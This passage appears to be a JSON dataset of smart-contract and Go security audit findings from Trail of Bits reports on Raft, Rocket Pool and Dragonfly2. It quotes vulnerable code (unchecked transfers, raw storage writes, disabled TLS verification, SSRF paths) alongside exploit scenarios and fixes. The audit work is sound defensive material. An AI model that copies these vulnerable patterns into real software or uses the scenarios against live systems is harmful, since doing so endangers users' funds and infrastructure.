PositionManagerStETH contract: { if (isCollateralIncrease) { stETH.transferFrom( msg.sender , address ( this ), collateralChange); stETH.approve( address (wstETH), collateralChange); uint256 wstETHAmount = wstETH.wrap(collateralChange); _managePosition( ... ); } else { _managePosition( ... ); uint256 stETHAmount = wstETH.unwrap(collateralChange); stETH.transfer( msg.sender , stETHAmount); } } Figure 4.2: Unchecked transfers in PositionManagerStETH.managePositionStETH Exploit Scenario Governance approves an ERC-20 token that returns a Boolean on failure to be used as collateral. However, since the return values of this ERC-20 token are not checked, Alice, a liquidator, does not receive any collateral for performing a liquidation. Recommendations Short term, use the SafeERC20 librarys safeTransfer function for the collateralToken . Long term, improve unit test coverage to uncover edge cases and ensure intended behavior throughout the protocol.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "5. Tokens may be trapped in an invalid position ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf", "body": "The Raft nance contracts allow users to take out positions by depositing collateral and minting a corresponding amount of R tokens as debt. In order to exit a position, a user must pay back their debt, which allows them to receive their collateral back. To check that a position is closed, the _managePosition function contains a branch that validates that the position's debt is zero after adjustment. However, if the position's debt is zero but there is still some collateral present even after adjustment, then the position is considered invalid and cannot be closed. This could be problematic, especially if some dust is present in the position after the collateral is withdrawn. if (positionDebt == 0 ) { if (positionCollateral != 0 ) { revert InvalidPosition(); } // position was closed, remove it _closePosition(collateralToken, position, false ); } else { _checkValidPosition(collateralToken, positionDebt, positionCollateral); if (newPosition) { collateralTokenForPosition[position] = collateralToken; emit PositionCreated(position); } } Figure 5.1: A snippet from the _managePosition function showing that a position with no debt cannot be closed if any amount of collateral remains Exploit Scenario Alice, a borrower, wants to pay back her debt and receive her collateral in exchange. However, she accidentally leaves some collateral in her position despite paying back all her debt. As a result, her position cannot be closed. Recommendations Short term, if a position's debt is zero, have the _managePosition function refund any excess collateral and close the position. Long term, carefully investigate potential edge cases in the system and use smart contract fuzzing to determine if those edge cases can be realistically reached.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Price deviations between stETH and ETH may cause Tellor oracle to return an incorrect price ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf", "body": "The Raft nance contracts rely on oracles to compute the price of the collateral tokens used throughout the codebase. If the Chainlink oracle is down, the Tellor oracle is used as a backup. However, the Tellor oracle does not use the stETH/USD price feed. Instead it uses the ETH/USD price feed to determine the price of stETH. This could be problematic if stETH depegs, which can occur during black swan events. function _getCurrentTellorResponse() internal view returns (TellorResponse memory tellorResponse) { uint256 count; uint256 time; uint256 value; try tellor.getNewValueCountbyRequestId(ETHUSD_TELLOR_REQ_ID) returns ( uint256 count_) { count = count_; } catch { return (tellorResponse); } Figure 6.1: The Tellor oracle fetching the price of ETH to determine the price of stETH Exploit Scenario Alice has a position in the system. A signicant black swan event causes the depeg of staked Ether. As a result, the Tellor oracle returns an incorrect price, which prevents Alice's position from being liquidated despite being eligible for liquidation. Recommendations Short term, carefully monitor the Tellor oracle, especially during any sort of market volatility. Long term, investigate the robustness of the oracles and document possible circumstances that could cause them to return incorrect prices.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Incorrect constant value for MAX_REDEMPTION_SPREAD ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf", "body": "The Raft protocol allows a user to redeem their R tokens for underlying wstETH at any time. By doing so, the protocol ensures that it maintains overcollateralization. The redemption spread is part of the redemption rate, which changes based on the price of the R token to incentivize or disincentivize redemption. However, the documentation says that the maximum redemption spread should be 100% and that the protocol will initially set it to 100%. In the code, the MAX_REDEMPTION_SPREAD constant is set to 2%, and the redemptionSpread variable is set to 1% at construction. This is problematic because setting the rate to 100% is necessary to eectively disable redemptions at launch. uint256 public constant override MIN_REDEMPTION_SPREAD = MathUtils._100_PERCENT / 10_000 * 25 ; // 0.25% uint256 public constant override MAX_REDEMPTION_SPREAD = MathUtils._100_PERCENT / 100 * 2 ; // 2% Figure 7.1: Constants specifying the minimum and maximum redemption spread percentages constructor (ISplitLiquidationCollateral newSplitLiquidationCollateral) FeeCollector( msg.sender ) { rToken = new RToken( address ( this ), msg.sender ); raftDebtToken = new ERC20Indexable( address ( this ), string ( bytes .concat( \"Raft \" , bytes (IERC20Metadata( address (rToken)).name()), \" debt\" )), string ( bytes .concat( \"r\" , bytes (IERC20Metadata( address (rToken)).symbol()), \"-d\" )) ); setRedemptionSpread(MathUtils._100_PERCENT / 100 ); setSplitLiquidationCollateral(newSplitLiquidationCollateral); emit PositionManagerDeployed(rToken, raftDebtToken, msg.sender ); } Figure 7.2: The redemption spread being set to 1% instead of 100% in the PositionManager s constructor Exploit Scenario The protocol sets the redemption spread to 2%. Alice, a borrower, redeems her R tokens for some underlying wstETH, despite the developers intentions. As a result, the stablecoin experiences signicant volatility. Recommendations Short term, set the MAX_REDEMPTION_SPREAD value to 100% and set the redemptionSpread variable to MAX_REDEMPTION_SPREAD in the PositionManager contracts constructor. Long term, improve unit test coverage to identify incorrect behavior and edge cases in the protocol.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "8. Liquidation rewards are calculated incorrectly ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf", "body": "Whenever a position's collateralization ratio falls between 100% and 110%, the position becomes eligible for liquidation. A liquidator can pay o the position's total debt to restore solvency. In exchange, the liquidator receives a liquidation reward for removing bad debt, in addition to the amount of debt the liquidator has paid o. However, the calculation performed in the split function is incorrect and does not reward the liquidator with the matchingCollateral amount of tokens: function split( uint256 totalCollateral, uint256 totalDebt, uint256 price, bool isRedistribution ) external pure returns ( uint256 collateralToSendToProtocol, uint256 collateralToSentToLiquidator) { if (isRedistribution) { ... } else { uint256 matchingCollateral = totalDebt.divDown(price); uint256 excessCollateral = totalCollateral - matchingCollateral; uint256 liquidatorReward = excessCollateral.mulDown(_calculateLiquidatorRewardRate(totalDebt)); collateralToSendToProtocol = excessCollateral - liquidatorReward; collateralToSentToLiquidator = liquidatorReward; } } Figure 8.1: The calculations for how to split the collateral between the liquidator and the protocol, showing that the matchingCollateral is omitted from the liquidators reward Exploit Scenario Alice, a liquidator, attempts to liquidate an insolvent position. However, upon liquidation, she receives only the liquidationReward amount of tokens, without the matchingCollateral . As a result her liquidation is unprotable and she has lost funds. Recommendations Short term, have the code compute the collateralToSendToLiquidator variable as liquidationReward + matchingCollateral . Long term, improve unit test coverage to uncover edge cases and ensure intended behavior throughout the protocol. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "1. Any network contract can change any nodes withdrawal address ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "The RocketStorage contract uses the eternal storage pattern. The contract is a key-value store that all protocol contracts can write to and read. However, RocketStorage has a special protected storage area that should not be writable by network contracts (gure 1.1); it should be writable only by node operators under specic conditions. This area stores data related to node operators withdrawal addresses and is critical to the security of their assets. // Protected storage (not accessible by network contracts) mapping(address => address) private withdrawalAddresses; mapping(address => address) private pendingWithdrawalAddresses; Figure 1.1: Protected storage in the RocketStorage contract (RocketStorage.sol#L24-L26) RocketStorage also has a number of setters for types that t in to a single storage slot. These setters are implemented by the raw sstore opcode (gure 1.2) and can be used to set any storage slot to any value. They can be called by any network contract, and the caller will have full control of storage slots and values. function setUint(bytes32 _key, uint _value) onlyLatestRocketNetworkContract override external { assembly { sstore (_key, _value) } } Figure 1.2: An example of a setter that uses sstore in the RocketStorage contract (RocketStorage.sol#L205-209) As a result, all network contracts can write to all storage slots in the RocketStorage contract, including those in the protected area. There are three setters that can set any storage slot to any value under any condition: setUint, setInt, and setBytes32. The addUint setter can be used if the unsigned integer representation of the value is larger than the current value; subUint can be used if it is smaller. Other setters such as setAddress and setBool can be used to set a portion of a storage slot to a value; the rest of the storage slot is zeroed out. However, they can still be used to delete any storage slot. In addition to undermining the security of the protected storage areas, these direct storage-slot setters make the code vulnerable to accidental storage-slot clashes. The burden of ensuring security is placed on the caller, who must pass in a properly hashed key. A bug could easily lead to the overwriting of the guardian, for example. Exploit Scenario Alice, a node operator, trusts Rocket Pools guarantee that her deposit will be protected even if other parts of the protocol are compromised. Attacker Charlie upgrades a contract that has write access to RocketStorage to a malicious version. Charlie then computes the storage slot of each node operators withdrawal address, including Alices, and calls rocketStorage.setUint(slot, charliesAddress) from the malicious contract. He can then trigger withdrawals and steal node operators funds. Recommendations Short term, remove all sstore operations from the RocketStorage contract. Use mappings, which are already used for strings and bytes, for all types. When using mappings, each value is stored in a slot that is computed from the hash of the mapping slot and the key, making it impossible for a user to write from one mapping into another unless that user nds a hash collision. Mappings will ensure proper separation of the protected storage areas. Strongly consider moving the protected storage areas and related operations into a separate immutable contract. This would make it much easier to check the access controls on the protected storage areas. Long term, avoid using assembly whenever possible. Ensure that assembly operations such as sstore do not enable the circumvention of access controls.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Current storage pattern fails to ensure type safety ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "As mentioned in TOB-ROCKET-001, the RocketStorage contract uses the eternal storage pattern. This pattern uses assembly to read and write to raw storage slots. Most of the systems data is stored in this manner, which is shown in gures 2.1 and 2.2. function setInt(bytes32 _key, int _value) onlyLatestRocketNetworkContract override external { assembly { sstore (_key, _value) } } Figure 2.1: RocketStorage.sol#L229-L233 function getUint(bytes32 _key) override external view returns (uint256 r) { assembly { r := sload (_key) } } Figure 2.2: RocketStorage.sol#L159-L163 If the same storage slot were used to write a value of type T and then to read a value of type U from the same slot, the value of U could be unexpected. Since storage is untyped, Soliditys type checker would be unable to catch this type mismatch, and the bug would go unnoticed. Exploit Scenario A codebase update causes one storage slot, S, to be used with two dierent data types. The compiler does not throw any errors, and the code is deployed. During transaction processing, an integer, -1, is written to S. Later, S is read and interpreted as an unsigned integer. Subsequent calculations use the maximum uint value, causing users to lose funds. Recommendations Short term, remove the assembly code and raw storage mapping from the codebase. Use a mapping for each type to ensure that each slot of the mapping stores values of the same type. Long term, avoid using assembly whenever possible. Use Solidity as a high-level language so that its built-in type checker will detect type errors.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "Rocket Pool has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Rocket Pool contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Upgradeable contracts can block minipool withdrawals ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "At the beginning of this audit, the Rocket Pool team mentioned an important invariant: if a node operator is allowed to withdraw funds from a minipool, the withdrawal should always succeed. This invariant is meant to assure node operators that they will be able to withdraw their funds even if the systems governance upgrades network contracts to malicious versions. To withdraw funds from a minipool, a node operator calls the close or refund function, depending on the state of the minipool. The close function calls rocketMinipoolManager.destroyMinipool. The rocketMinipoolManager contract can be upgraded by governance, which could replace it with a version in which destroyMinipool reverts. This would cause withdrawals to revert, breaking the guarantee mentioned above. The refund function does not call any network contracts. However, the refund function cannot be used to retrieve all of the funds that close can retrieve. Governance could also tamper with the withdrawal process by altering node operators withdrawal addresses. (See TOB-ROCKET-001 for more details.) Exploit Scenario Alice, a node operator, owns a dissolved minipool and decides to withdraw her funds. However, before Alice calls close() on her minipool to withdraw her funds, governance upgrades the RocketMinipoolManager contract to a version in which calls to destroyMinipool fail. As a result, the close() functions call to RocketMinipoolManager.destroyMinipool fails, and Alice is unable to withdraw her funds. Recommendations Short term, use Soliditys try catch statement to ensure that withdrawal functions that should always succeed are not aected by function failures in other network contracts. Additionally, ensure that no important data validation occurs in functions whose failures are ignored. Long term, carefully examine the process through which node operators execute withdrawals and ensure that their withdrawals cannot be blocked by other network contracts.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "5. Lack of contract existence check on delegatecall will result in unexpected behavior ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "The RocketMinipool contract uses the delegatecall proxy pattern. If the implementation contract is incorrectly set or is self-destructed, the contract may not detect failed executions. The RocketMinipool contract implements a payable fallback function that is invoked when contract calls are executed. This function does not have a contract existence check: fallback(bytes calldata _input) external payable returns (bytes memory) { // If useLatestDelegate is set, use the latest delegate contract address delegateContract = useLatestDelegate ? getContractAddress(\"rocketMinipoolDelegate\") : rocketMinipoolDelegate; (bool success, bytes memory data) = delegateContract.delegatecall(_input); if (!success) { revert(getRevertMessage(data)); } return data; } Figure 5.1: RocketMinipool.sol#L102-L108 The constructor of the RocketMinipool contract also uses the delegatecall function without performing a contract existence check: constructor(RocketStorageInterface _rocketStorageAddress, address _nodeAddress, MinipoolDeposit _depositType) { [...] (bool success, bytes memory data) = getContractAddress(\"rocketMinipoolDelegate\").delegatecall(abi.encodeWithSignature('initialis e(address,uint8)', _nodeAddress, uint8(_depositType))); if (!success) { revert(getRevertMessage(data)); } } Figure 5.2: RocketMinipool.sol#L30-L43 A delegatecall to a destructed contract will return success as part of the EVM specication. The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their rst return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 5.3: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall The contract will not throw an error if its implementation is incorrectly set or self-destructed. It will instead return success even though no code was executed. Exploit Scenario Eve upgrades the RocketMinipool contract to point to an incorrect new implementation. As a result, each delegatecall returns success without changing the state or executing code. Eve uses this failing to scam users. Recommendations Short term, implement a contract existence check before a delegatecall. Document the fact that suicide and selfdestruct can lead to unexpected behavior, and prevent future upgrades from introducing these functions. Long term, carefully review the Solidity documentation, especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern. References  Contract Upgrade Anti-Patterns  Breaking Aave Upgradeability", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "6. tx.origin in RocketStorage authentication may be an attack vector ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "The RocketStorage contract contains all system storage values and the functions through which other contracts write to them. To prevent unauthorized calls, these functions are protected by the onlyLatestRocketNetworkContract modier. function setUint(bytes32 _key, uint _value) onlyLatestRocketNetworkContract override external { assembly { sstore (_key, _value) } } Figure 6.1: RocketStorage.sol#L205-209 The contract also contains a storageInit ag that is set to true when the system values have been initialized. function setDeployedStatus() external { // Only guardian can lock this down require(msg.sender == guardian, \"Is not guardian account\"); // Set it now storageInit = true; } Figure 6.2: RocketStorage.sol#L89-L94 The onlyLatestRocketNetworkContract modier has a switch and is disabled when the system is in the initialization phase. modifier onlyLatestRocketNetworkContract() { if (storageInit == true) { // Make sure the access is permitted to only contracts in our Dapp require(_getBool(keccak256(abi.encodePacked(\"contract.exists\", msg.sender))), \"Invalid or outdated network contract\"); } else { // Only Dapp and the guardian account are allowed access during initialisation. // tx.origin is only safe to use in this case for deployment since no external contracts are interacted with require(( tx.origin == guardian _getBool(keccak256(abi.encodePacked(\"contract.exists\", msg.sender))) || ), \"Invalid or outdated network contract attempting access during deployment\"); } _; } Figure 6.3: RocketStorage.sol#L36-L48 If the system is still in the initialization phase, any call that originates from the guardian account will be trusted. Exploit Scenario Eve creates a malicious airdrop contract, and Alice, the Rocket Pool systems guardian, calls it. The contract then calls RocketStorage and makes a critical storage update. After the updated value has been initialized, Alice sets storageInit to true, but the storage value set in the update persists, increasing the risk of a critical vulnerability. Recommendations Short term, clearly document the fact that during the initialization period, the guardian may not call any external contracts; nor may any system contract that the guardian calls make calls to untrusted parties. Long term, document all of the systems assumptions, both in the portions of code in which they are realized and in all places in which they aect stakeholders operations.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "7. Duplicated storage-slot computation can silently introduce errors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "Many parts of the Rocket Pool codebase that access its eternal storage compute storage locations inline, which means that these computations are duplicated throughout the codebase. Many string constants appear in the codebase several times; these include minipool.exists (shown in gure 7.1), which appears four times. Duplication of the same piece of information in many parts of a codebase increases the risk of inconsistencies. Furthermore, because the code lacks existence and type checks for these strings, inconsistencies introduced into a contract by developer error may not be detected unless the contract starts behaving in unexpected ways. setBool(keccak256(abi.encodePacked(\"minipool.exists\", contractAddress)), true); Figure 7.1: RocketMinipoolManager.sol#L216 Many storage-slot computations take parameters. However, there are no checks on the types or number of the parameters that they take, and incorrect parameter values will not be caught by the Solidity compiler. Exploit Scenario Bob, a developer, adds a functionality that sets the network.prices.submitted.node.key string constant. He ABI-encodes the node address, block, and RPL price arguments but forgets to ABI-encode the eective RPL stake amount. The code then sets an entirely new storage slot that is not read anywhere else. As a result, the write operation is a no-op with undened consequences. Recommendations Short term, extract the computation of storage slots into helper functions (like that shown in 7.2). This will ensure that each string constant exists only in a single place, removing the potential for inconsistencies. These functions can also check the types of the parameters used in storage-slot computations. function contractExistsSlot(address contract) external pure returns (bytes32) { return keccak256(abi.encodePacked(\"contract.exists\", contract); } // _getBool(keccak256(abi.encodePacked(\"contract.exists\", msg.sender)) _getBool(contractExistsSlot(msg.sender)) // setBool(keccak256(abi.encodePacked(\"contract.exists\", _contractAddress)), true) setBool(contractExistsSlot(_contractAddress), true) Figure 7.2: An example of a helper function Long term, replace the raw setters and getters in RocketBase (e.g., setAddress) with setters and getters for specic values (e.g., the setContractExists setter) and restrict RocketStorage access to these setters.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "8. Potential collisions between eternal storage and Solidity mapping storage slots ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf", "body": "The Rocket Pool code uses eternal storage to store many named mappings. A named mapping is one that is identied by a string (such as minipool.exists) and maps a key (like contractAddress in gure 8.1) to a value. setBool(keccak256(abi.encodePacked(\"minipool.exists\", contractAddress)), true); Figure 8.1: RocketMinipoolManager.sol#L216 Given a mapping whose state variable appears at index N in the code, Solidity stores the value associated with key at a slot that is computed as follows: h = type(key) == string || type(key) == bytes ? keccak256 : left_pad_to_32_bytes slot = keccak256(abi.encodePacked(h(key), N)) Figure 8.2: Pseudocode of the Solidity computation of a mappings storage slot The rst item in a Rocket Pool mapping is the identier, which could enable an attacker to write values into a mapping that should be inaccessible to the attacker. We set the severity of this issue to informational because such an attack does not currently appear to be possible. Exploit Scenario Mapping A stores its state variable at slot n. Rocket Pool developers introduce new code, making it possible for an attacker to change the second argument to abi.encodePacked in the setBool setter (shown in gure 8.1). The attacker passes in a rst argument of 32 bytes and can then pass in n as the second argument and set an entry in Mapping A. Recommendations Short term, switch the order of arguments such that a mappings identier is the last argument and the key (or keys) is the rst (as in keccak256(key, unique_identifier_of_mapping)). Long term, carefully examine all raw storage operations and ensure that they cannot be used by attackers to access storage locations that should be inaccessible to them. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Authentication is not enabled for some Managers endpoints ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The /api/v1/jobs and /preheats endpoints in Manager web UI are accessible without authentication. Any user with network access to the Manager can create, delete, and modify jobs, and create preheat jobs. job := apiv1.Group( \"/jobs\" ) Figure 1.1: The /api/v1/jobs endpoint denition ( Dragonfly2/manager/router/router.go#191 ) // Compatible with the V1 preheat. pv1 := r.Group( \"/preheats\" ) r.GET( \"_ping\" , h.GetHealth) pv1.POST( \"\" , h.CreateV1Preheat) pv1.GET( \":id\" , h.GetV1Preheat) Figure 1.2: The /preheats endpoint denition ( Dragonfly2/manager/router/router.go#206210 ) Exploit Scenario An unauthenticated adversary with network access to a Manager web UI uses /api/v1/jobs endpoint to create hundreds of useless jobs. The Manager is in a denial-of-service state, and stops accepting requests from valid administrators. Recommendations Short term, add authentication and authorization to the /api/v1/jobs and /preheats endpoints. Long term, rewrite the Manager web API so that all endpoints are authenticated and authorized by default, and only selected endpoints explicitly disable these security controls. Alternatively, rewrite the API into public and private parts using groups, as demonstrated in this comment . The proposed design will prevent developers from forgetting to protect some endpoints.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "2. Server-side request forgery vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "There are multiple server-side request forgery (SSRF) vulnerabilities in the DragonFly2 system. The vulnerabilities enable users to force DragonFly2s components to make requests to internal services, which otherwise are not accessible to the users. One SSRF attack vector is exposed by the Managers API. The API allows users to create jobs. When creating a Preheat type of a job, users provide a URL that the Manager connects to (see gures 2.12.3). The URL is weakly validated, and so users can trick the Manager into sending HTTP requests to services that are in the Managers local network. func (p *preheat) CreatePreheat(ctx context.Context, schedulers []models.Scheduler, json types.PreheatArgs) (*internaljob.GroupJobState, error ) { [skipped] url := json.URL [skipped] // Generate download files var files []internaljob.PreheatRequest switch PreheatType(json.Type) { case PreheatImageType: // Parse image manifest url skipped , err := parseAccessURL(url) [skipped] nethttp.MapToHeader(rawheader), image) files, err = p.getLayers(ctx, url, tag, filter, [skipped] case PreheatFileType: [skipped] } Figure 2.1: A method handling Preheat job creation requests ( Dragonfly2/manager/job/preheat.go#89132 ) func (p *preheat) getLayers (ctx context.Context, url, tag, filter string , header http.Header, image *preheatImage) ([]internaljob.PreheatRequest, error ) { ctx, span := tracer.Start(ctx, config.SpanGetLayers, trace.WithSpanKind(trace.SpanKindProducer)) defer span.End() resp, err := p.getManifests(ctx, url, header) Figure 2.2: A method called by the CreatePreheat function ( Dragonfly2/manager/job/preheat.go#176180 ) func (p *preheat) getManifests(ctx context.Context, url string , header http.Header) (*http.Response, error ) { req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil ) if err != nil { return nil , err } req.Header = header req.Header.Add(headers.Accept, schema2.MediaTypeManifest) client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } resp, err := client.Do(req) if err != nil { return nil , err } return resp, nil } Figure 2.3: A method called by the getLayers function ( Dragonfly2/manager/job/preheat.go#211233 ) A second attack vector is in peer-to-peer communication. A peer can ask another peer to make a request to an arbitrary URL by triggering the pieceManager.DownloadSource method (gure 2.4), which calls the httpSourceClient.GetMetadata method, which performs the request. func (pm *pieceManager) DownloadSource(ctx context.Context, pt Task, peerTaskRequest *schedulerv1.PeerTaskRequest, parsedRange *nethttp.Range) error { Figure 2.4: Signature of the DownloadSource function ( Dragonfly2/client/daemon/peer/piece_manager.go#301 ) Another attack vector is due to the fact that HTTP clients used by the DragonFly2s components do not disable support for HTTP redirects. This conguration means that an HTTP request sent to a malicious server may be redirected by the server to a components internal service. Exploit Scenario An unauthenticated user with access to the Manager API registers himself with a guest account. The user creates a preheat jobhe is allowed to do so, because of a bug described in TOB-DF2-1 with a URL pointing to an internal service. The Manager makes the request to the service on behalf of the malicious user. Recommendations Short term, investigate all potential SSRF attack vectors in the DragonFly2 system and mitigate risks by either disallowing requests to internal networks or creating an allowlist conguration that would limit networks that can be requested. Disable automatic HTTP redirects in HTTP clients. Alternatively, inform users about the SSRF attack vectors and provide them with instructions on how to mitigate this attack on the network level (e.g., by conguring rewalls appropriately). Long term, ensure that applications cannot be tricked to issue requests to arbitrary locations provided by its users. Consider implementing a single, centralized class responsible for validating the destinations of requests. This will increase code maturity with respect to HTTP request handling.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "3. Manager makes requests to external endpoints with disabled TLS authentication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The Manager disables TLS certicate verication in two HTTP clients (gures 3.1 and 3.2). The clients are not congurable, so users have no way to re-enable the verication. func getAuthToken(ctx context.Context, header http.Header) ( string , error ) { [skipped] client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } [skipped] } Figure 3.1: getAuthToken function with disabled TLS certicate verication ( Dragonfly2/manager/job/preheat.go#261301 ) func (p *preheat) getManifests(ctx context.Context, url string , header http.Header) (*http.Response, error ) { [skipped] client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } [skipped] } Figure 3.2: getManifests function with disabled TLS certicate verication ( Dragonfly2/manager/job/preheat.go#211233 ) Exploit Scenario A Manager processes dozens of preheat jobs. An adversary performs a network-level Man-in-the-Middle attack, providing invalid data to the Manager. The Manager preheats with the wrong data, which later causes a denial of service and le integrity problems. Recommendations Short term, make the TLS certicate verication congurable in the getManifests and getAuthToken methods. Preferably, enable the verication by default. Long term, enumerate all HTTP, gRPC, and possibly other clients that use TLS and document their congurable and non-congurable (hard-coded) settings. Ensure that all security-relevant settings are congurable or set to secure defaults. Keep the list up to date with the code. 4. Incorrect handling of a task structures usedTra\u0000c eld Severity: Low Diculty: Medium Type: Data Validation Finding ID: TOB-DF2-4 Target: Dragonfly2/client/daemon/peer/piece_manager.go", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "5. Directories created via os.MkdirAll are not checked for permissions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "DragonFly2 uses the os.MkdirAll function to create certain directory paths with specic access permissions. This function does not perform any permission checks when a given directory path already exists. This allows a local attacker to create a directory to be used later by DragonFly2 with broad permissions before DragonFly2 does so, potentially allowing the attacker to tamper with the les. Exploit Scenario Eve has unprivileged access to the machine where Alice uses DragonFly2. Eve watches the commands executed by Alice and introduces new directories/paths with 0777 permissions before DragonFly2 does so. Eve can then delete and forge les in that directory to change the results of further commands executed by Alice. Recommendations Short term, when using utilities such as os.MkdirAll , os.WriteFile , or outil.WriteFile , check all directories in the path and validate their owners and permissions before performing operations on them. This will help avoid situations where sensitive information is written to a pre-existing attacker-controlled path. Alternatively, explicitly call the chown and chmod methods on newly created les and permissions. We recommend making a wrapper method around le and directory creation functions that would handle pre-existence checks or would chain the previously mentioned methods. Long term, enumerate les and directories for their expected permissions overall, and build validation to ensure appropriate permissions are applied before creation and upon use. Ideally, this validation should be centrally dened and used throughout the entire application.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "6. Slicing operations with hard-coded indexes and without explicit length validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "In the buildDownloadPieceHTTPRequest and DownloadTinyFile methods (gures 6.1 and 6.2), there are array slicing operations with hard-coded indexes. If the arrays are smaller than the indexes, the code panics. This ndings severity is informational, as we were not able to trigger the panic with a request from an external actor. func (p *pieceDownloader) buildDownloadPieceHTTPRequest(ctx context.Context, d *DownloadPieceRequest) *http.Request { // FIXME switch to https when tls enabled targetURL := url.URL{ Scheme: Host: Path: RawQuery: fmt.Sprintf( \"peerId=%s\" , d.DstPid), p.scheme, d.DstAddr, fmt.Sprintf( \"download/%s/%s\" , d.TaskID[: 3 ], d.TaskID), } Figure 6.1: If d.TaskID length is less than 3, the code panics ( Dragonfly2/client/daemon/peer/piece_downloader.go#198205 ) func (p *Peer) DownloadTinyFile() ([] byte , error ) { ctx, cancel := context.WithTimeout(context.Background(), downloadTinyFileContextTimeout) defer cancel() // Download url: http://${host}:${port}/download/${taskIndex}/${taskID}?peerId=${peerID} targetURL := url.URL{ Scheme: Host: Path: RawQuery: fmt.Sprintf( \"peerId=%s\" , p.ID), \"http\" , fmt.Sprintf( \"%s:%d\" , p.Host.IP, p.Host.DownloadPort), fmt.Sprintf( \"download/%s/%s\" , p.Task.ID[: 3 ], p.Task.ID), } Figure 6.2: If p.Task.ID length is less than 3, the code panics ( Dragonfly2/scheduler/resource/peer.go#436446 ) Recommendations Short term, explicitly validate lengths of arrays before performing slicing operations with hard-coded indexes. If the arrays are known to always be of sucient size, add a comment in code to indicate this, so that further reviewers of the code will not have to triage this false positive. Long term, add fuzz testing to the codebase. This type of testing helps to identify missing data validation and inputs triggering panics.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Files are closed without error check ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "Several methods in the DragonFly2 codebase defer le close operations after writing to a le. This may introduce undened behavior, as the les content may not be ushed to disk until the le has been closed. Errors arising from the inability to 